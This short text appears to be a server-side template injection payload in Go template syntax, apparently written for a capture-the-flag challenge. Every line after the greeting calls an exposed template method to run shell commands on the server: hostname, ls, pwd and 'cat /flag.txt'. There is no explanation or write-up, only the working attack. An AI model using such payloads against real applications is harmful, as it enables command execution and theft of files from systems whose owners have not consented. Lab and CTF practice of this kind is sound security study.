Hello, {{.ClientUA}}

test, {{ .FetchServerInfo "hostname" }}

ls, {{ .FetchServerInfo "ls" }}

cat, {{ .FetchServerInfo "pwd" }}

cat: {{ .FetchServerInfo "cat /flag.txt" }}
